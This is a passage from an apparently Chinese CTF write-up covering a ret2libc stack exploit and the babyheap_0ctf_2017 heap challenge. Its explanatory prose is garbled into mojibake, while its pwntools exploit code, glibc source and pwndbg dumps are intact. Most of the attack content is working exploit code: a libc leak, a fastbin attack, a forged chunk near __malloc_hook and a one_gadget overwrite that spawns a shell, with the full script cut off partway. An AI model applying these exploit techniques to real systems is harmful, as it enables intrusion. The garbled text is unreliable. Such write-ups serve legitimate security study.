</span></span></code></pre></td></tr></table></div></div><p><code>a1</code> å°±æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ <code>v2</code>ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå¯ä»¥å‘ <code>buf</code> å†™å…¥çš„æ•°æ®é•¿åº¦ä¹Ÿæ˜¯æˆ‘ä»¬èƒ½æ§åˆ¶çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¸Œæœ›å®ƒå°½å¯èƒ½å¤§ï¼Œä¹Ÿå°±æ˜¯ç­‰äº <code>0xff</code>ã€‚é‚£ä¹ˆåœ¨ä¸Šä¸€ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬å°±éœ€è¦ä»¤ <code>v5</code> ä¸º <code>0xff</code>ï¼Œç»“åˆä¸Šé¢çš„ç»•è¿‡ï¼Œå¯ä»¥è¾“å…¥ <code>'\x00' + 6*'a' + '\xff'</code> æ¥è¾¾åˆ°è¿™ä¸ªç›®çš„ã€‚æœ€å <code>ret2libc</code> å³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>send1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>6</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\xff</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Correct</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>send1</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>main</span> <span class=o>=</span> <span class=mh>0x8048825</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0xe7</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span><span class=n>main</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>],</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>leak</span><span class=p>,</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>send1</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0xe7</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span><span class=n>system</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>binsh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=babyheap_0ctf_2017>babyheap_0ctf_2017</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>===== Baby Heap in 2017 =====
</span></span><span class=line><span class=cl>1. Allocate
</span></span><span class=line><span class=cl>2. Fill
</span></span><span class=line><span class=cl>3. Free
</span></span><span class=line><span class=cl>4. Dump
</span></span><span class=line><span class=cl>5. Exit
</span></span></code></pre></td></tr></table></div></div><p>åˆ†é…å†…å­˜ä½¿ç”¨äº† <code>calloc</code>ï¼Œæ¯æ¬¡åˆ†é…ä¼šå…ˆæ¸…ç©ºä¸€ä¸‹è¿™å—å†…å­˜ï¼Œå¤§å°é™åˆ¶æ˜¯ 4096Bã€‚å¡«å……æ—¶ç›´æ¥è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œæ²¡æœ‰æ£€æŸ¥é•¿åº¦ï¼Œå› æ­¤å¯ä»¥å †æº¢å‡ºã€‚é™¤äº† canary å¤–ä¿æŠ¤å…¨å¼€ï¼Œå› æ­¤è€ƒè™‘æ³„éœ² libcã€‚å¦‚ä½•æ³„éœ²ï¼Ÿ</p><p>å½“åªæœ‰ä¸€ä¸ª small bin/large bin è¢«é‡Šæ”¾æ—¶ï¼Œå…¶ <code>fd</code> ä¸ <code>bk</code> æŒ‡å‘ <code>main_arena</code> ä¸­çš„åœ°å€ï¼Œè€Œåè€…æ˜¯ libc çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å®ƒæ³„éœ²å‡º libc åŸºå€ã€‚</p><p>é¦–å…ˆåˆ†é… 4 ä¸ª fast chunk å’Œ 1 ä¸ª small chunkï¼ˆä¸å¦¨åˆ†åˆ«ç§°ä¸º <code>a,b,c,d,e</code>ï¼‰ï¼Œç„¶åé‡Šæ”¾ <code>b</code>ï¼Œå®ƒå°†è¢«åŠ å…¥ fast bin é¡¶éƒ¨ã€‚æ­¤æ—¶å†é‡Šæ”¾ <code>c</code>ï¼Œé‚£ä¹ˆ <code>c</code> ä¹Ÿä¼šåŠ å…¥ fast bin é¡¶éƒ¨ï¼Œå¹¶ä¸”å®ƒçš„ <code>fd</code> æŒ‡å‘ <code>b</code>ã€‚æ­¤æ—¶æœ‰ï¼š<code>freelist->c->b</code>ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>alloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=c1># a0,b1,c2,d3</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># e4</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># b</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># c</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™æ ·å°±å¯ä»¥è¿›è¡Œ fastbin attackã€‚åˆ©ç”¨ <code>Fill</code> å †æº¢å‡ºä¿®æ”¹ <code>c</code> çš„ <code>fd</code> ä¸º <code>e</code> çš„åœ°å€ï¼ˆæˆ‘ä»¬éœ€è¦ä»æœªè¢«é‡Šæ”¾çš„ <code>a</code> å¼€å§‹å¡«å……ï¼Œæ‰€ä»¥åˆšæ‰ä¸æ˜¯ä» <code>a</code> å¼€å§‹é‡Šæ”¾ï¼‰ï¼Œéšåç¬¬ä¸€æ¬¡ <code>Allocate</code> æ‹¿åˆ° <code>c</code>ï¼Œç¬¬äºŒæ¬¡ <code>Allocate</code> å°±èƒ½æ‹¿åˆ° <code>e</code>ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># c-&gt;fd = e</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x80</span><span class=s1>&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„è¿™é‡Œ payload çš„å‰ä¸‰ä¸ª <code>0</code> ç”¨äºå¡«å…… <code>a</code> ä¸­ <code>0x10</code> å­—èŠ‚çš„ç”¨æˆ·æ•°æ®å’Œ <code>b</code> ä¸­ <code>0x8</code> å­—èŠ‚çš„ <code>prev_size</code> å­—æ®µï¼Œåé¢åŒç†ã€‚<code>0x21</code> æ˜¯ <code>a/b/c/d</code> çš„ <code>chunk_size</code>ï¼Œ<code>0x80</code> æ˜¯ <code>e</code> çš„åœ°å€ä½ 8 ä½ï¼Œéƒ½å¯ä»¥é€šè¿‡ gdb è°ƒè¯•å¾—åˆ°ã€‚</p><blockquote><p>æ³¨ï¼š<code>0x21</code> ä½ä½çš„ <code>1</code> è¡¨ç¤º <code>PREV_INUSE</code>ï¼Œè¿™å’Œ fast bin ä¸­ chunk çš„ P ä½ä¸å˜æ˜¯ä¸€è‡´çš„ã€‚</p></blockquote><p>ç„¶è€Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªå®‰å…¨æ£€æŸ¥ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define fastbin_index(sz) \
</span></span></span><span class=line><span class=cl><span class=cp>  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>__builtin_expect</span> <span class=p>(</span><span class=n>fastbin_index</span> <span class=p>(</span><span class=n>chunksize</span> <span class=p>(</span><span class=n>victim</span><span class=p>))</span> <span class=o>!=</span> <span class=n>idx</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>errstr</span> <span class=o>=</span> <span class=s>&#34;malloc(): memory corruption (fast)&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nl>errout</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>malloc_printerr</span> <span class=p>(</span><span class=n>check_action</span><span class=p>,</span> <span class=n>errstr</span><span class=p>,</span> <span class=n>chunk2mem</span> <span class=p>(</span><span class=n>victim</span><span class=p>),</span> <span class=n>av</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æ£€æŸ¥æˆ‘ä»¬æ‹¿åˆ°çš„ chunk çš„å¤§å°æ˜¯å¦åœ¨å¯¹åº”ç´¢å¼•çš„ fast bin èŒƒå›´å†…ã€‚æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹ <code>e</code> çš„ <code>chunk_size</code> å­—æ®µï¼Œæ–¹æ³•åŒæ ·æ˜¯å †æº¢å‡ºã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># e-&gt;chunk_size = 0x21</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œé€šè¿‡ <code>d</code> æº¢å‡ºåˆ° <code>e</code> çš„ <code>chunk_size</code> å¹¶è¦†ç›–ä¸Šäº† <code>0x21</code>ï¼Œgdb è°ƒè¯•å¾—åˆ°å…¶ç´¢å¼•ä¸º <code>2</code>ã€‚</p><p>ä¿®æ”¹å®Œæˆåæ‰å¯ä»¥è¿›è¡Œä¸¤æ¬¡ <code>alloc(0x10)</code> ä»è€Œæ‹¿åˆ° <code>e</code>ã€‚æ‹¿åˆ° <code>e</code> åå†é‡Šæ”¾æ‰å®ƒå°±å¯ä»¥è·å¾—å…¶ <code>fd</code> ä¸ <code>bk</code>ï¼Œä½†è¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p><ol><li>å‰é¢å¯¹å…¶ <code>chunk_size</code> çš„ä¿®æ”¹ä¼šå¯¼è‡´é‡Šæ”¾æ—¶ <code>e</code> è¿›å…¥ fast binï¼Œæ‹¿ä¸åˆ° <code>fd</code> å’Œ <code>bk</code>ã€‚</li><li><code>e</code> è¢«é‡Šæ”¾åä¸ top chunk ç›¸é‚»ï¼Œå¿…å®šä¼šè¢«åˆå¹¶ã€‚</li><li><code>fd</code> å’Œ <code>bk</code> åˆ°åº•æŒ‡å‘å“ªé‡Œï¼Ÿ</li></ol><p>è§£ç­”ï¼š</p><ol><li>æŠŠ <code>e</code> çš„ <code>chunk_size</code> æ¢å¤å³å¯ã€‚</li><li>é‡Šæ”¾ <code>e</code> å‰å†å¤šç”³è¯·ä¸€ä¸ª small chunk ä½¿å¾— <code>e</code> ä¸ä¸ top chunk ç›¸é‚»ã€‚</li><li><code>e</code> è¢«é‡Šæ”¾åè¿›å…¥ unsorted binï¼Œæ‰€ä»¥å…¶ <code>fd</code> ä¸ <code>bk</code> éƒ½æŒ‡å‘ unsorted bin çš„é“¾è¡¨å¤´ï¼Œæ³¨æ„å…¶åœ°å€åˆ° libc åŸºå€çš„åç§»æ˜¯å›ºå®šçš„ <code>0x3c4b78</code>ã€‚</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># e-&gt;chunk_size = 0x91</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x91</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># f5</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># e, e-&gt;fd = unsorted_head</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>dump</span><span class=p>(</span><span class=mi>2</span><span class=p>)[:</span><span class=mi>8</span><span class=p>])</span><span class=o>-</span><span class=mh>0x3c4b78</span>
</span></span></code></pre></td></tr></table></div></div><p>æœ€åçš„ <code>dump(2)</code> å°±æ˜¯æ‰“å°ç´¢å¼•ä¸º <code>2</code> çš„ chunkï¼Œä¹Ÿå°±æ˜¯ <code>e</code>ï¼Œä»è€Œå¾—åˆ° <code>e</code> çš„ <code>fd</code> å’Œ <code>bk</code>ã€‚</p><p>ä¹‹åï¼Œå†æ¬¡ä½¿ç”¨ fast bin attack å°† libc ä¸­å‡½æ•°ï¼Œä¾‹å¦‚ <code>__malloc_hook</code> æ”¾å…¥ fast binï¼Œç„¶åç”¨ <code>malloc</code> è¿”å›ç»™æˆ‘ä»¬ï¼Œå°±å¯ä»¥å®ç°ç±»ä¼¼ GOT åŠ«æŒçš„æ•ˆæœã€‚<code>__malloc_hook</code> åªè¦éç©ºï¼Œå°±ä¼šåœ¨ <code>malloc</code> æ—¶è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬è®©å®ƒæŒ‡å‘ <code>one_gadget</code> æ‰¾åˆ°çš„ä¸€ä¸ª gadget å³å¯ï¼Œæ¯”å¦‚å¯ä»¥ç”¨è·ç¦» libc åŸºå€ 0x4526a çš„ gadgetã€‚</p><p>ä½†æ˜¯åŒæ ·çš„ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡ä¸Šé¢çš„å®‰å…¨æ£€æŸ¥ã€‚å¹¸è¿çš„æ˜¯ï¼Œè¯¥æ£€æŸ¥å¯¹äºå¯¹é½æ²¡æœ‰ä»»ä½•è¦æ±‚ã€‚é€šè¿‡ gdb è°ƒè¯•æˆ‘ä»¬å‘ç°åœ¨ <code>__malloc_hook</code> é™„è¿‘çš„ <code>_IO_wide_data_0+304</code> ä½ç½®å…¶é«˜ä½å­—èŠ‚ä¸º <code>7f</code> è€Œä½ä½å­—èŠ‚å«æœ‰è¿ç»­çš„ <code>00</code>ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å¢åŠ ä¸€äº›åç§»è·å¾— <code>0x7f</code> è¿™ä¸ªæ•°å€¼ä½œä¸º <code>chunk_size</code>ï¼Œæ°å¥½èƒ½é€šè¿‡æ£€æŸ¥ã€‚</p><p>å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pwndbg&gt; x/32xg (long long)(&amp;main_arena)-0x40
</span></span><span class=line><span class=cl>0x7f16d95deae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span class=line><span class=cl>0x7f16d95deaf0 &lt;_IO_wide_data_0+304&gt;:	0x00007f16d95dd260	0x0000000000000000
</span></span><span class=line><span class=cl>0x7f16d95deb00 &lt;__memalign_hook&gt;:	0x00007f16d929fe20	0x00007f16d929fa00
</span></span><span class=line><span class=cl>0x7f16d95deb10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000
</span></span></code></pre></td></tr></table></div></div><p>æˆ‘ä»¬åŠ  13 å­—èŠ‚åç§»ï¼ˆå¾ªç¯å³ç§»ï¼‰ï¼ŒæˆåŠŸä¼ªé€  <code>chunk_size</code>ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pwndbg&gt; x/32xg (long long)(&amp;main_arena)-0x40+0xd
</span></span><span class=line><span class=cl>0x7f16d95deaed &lt;_IO_wide_data_0+301&gt;:	0x16d95dd260000000	0x000000000000007f
</span></span><span class=line><span class=cl>0x7f16d95deafd:	0x16d929fe20000000	0x16d929fa0000007f
</span></span><span class=line><span class=cl>0x7f16d95deb0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000
</span></span><span class=line><span class=cl>0x7f16d95deb1d:	0x0000000000000000	0x0000000000000000
</span></span></code></pre></td></tr></table></div></div><p><code>0x7f</code> å¯¹åº”çš„ <code>malloc</code> è¯·æ±‚å¤§å°å¤§çº¦æ˜¯ <code>0x60</code>ã€‚ç°åœ¨ï¼Œfreelist é¡¶éƒ¨æ˜¯ <code>e</code>ï¼Œäºæ˜¯ <code>alloc(0x60)</code> å°±ä¼šåˆ†é…æ€»å¤§å°ä¸º <code>0x71</code>ã€èµ·ç‚¹ä¸ <code>e</code> ç›¸åŒã€ä¸”ç´¢å¼•ä¸º <code>4</code> çš„ chunk <code>g</code>ï¼Œè¿™æ—¶å† <code>free</code> æ‰ <code>g</code> å°±ä¼šä½¿å¾— <code>g</code> ä½äº freelist é¡¶éƒ¨ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># g4</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># g</span>
</span></span></code></pre></td></tr></table></div></div><p>æ¥ä¸‹æ¥ä¿®æ”¹ç´¢å¼•ä¸º <code>2</code> çš„ chunk çš„ <code>fd</code>ï¼ˆå®é™…å°±æ˜¯ä¸ºäº†ä¿®æ”¹ <code>e</code> æˆ–è€…è¯´ <code>g</code> çš„ <code>fd</code>ï¼‰æŒ‡å‘ <code>_IO_wide_data_0+301</code> åœ°å€ï¼Œç„¶åç¬¬ä¸€æ¬¡ <code>Allocate</code> å¾—åˆ° <code>g</code> ä½äºç´¢å¼• <code>5</code>ï¼Œç¬¬äºŒæ¬¡ <code>Allocate</code> å¾—åˆ°æŒ‡å‘ <code>_IO_wide_data_0+301</code> çš„æŒ‡é’ˆï¼Œä½äºç´¢å¼• <code>6</code>ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># g-&gt;fd = _IO()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>base</span><span class=o>+</span><span class=mh>0x3c4aed</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># g5</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># _IO()6</span>
</span></span></code></pre></td></tr></table></div></div><p>è€Œç”±ä¸Šé¢çš„ gdb åˆ†æå¯çŸ¥å¾—åˆ°çš„æŒ‡é’ˆä½äº <code>0xaed</code>ï¼Œ<code>__malloc_hook</code> ä½äº <code>0xb10</code>ï¼ˆPIE ä¸‹ä½ 12 ä½å›ºå®šï¼‰ï¼Œç›¸å·® <code>0x13</code>ã€‚å› æ­¤å¡«å…… <code>0x13</code> å­—èŠ‚çš„ padding åå†æ”¾ä¸Š getshell çš„ gadget åœ°å€å³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># _IO() + 13 == __malloc_hook(), one_gadget</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x13</span><span class=p>,</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x4526a</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>fill</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>æœ€åä¸è¦å¿˜è®°å†ç”³è¯·ä¸€æ¬¡ä»»æ„å¤§å°å†…å­˜ä»¥è°ƒç”¨ <code>__malloc_hook</code>ã€‚å®Œæ•´ expï¼Œæ³¨æ„æœ€åä¸€æ¬¡ alloc è¿”å›å¾—æœ‰ç‚¹æ…¢ï¼Œ<code>recvuntil</code> æœ€å¥½åŠ ä¸€ä¸ª <code>timeout</code>ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>alloc</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fill</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
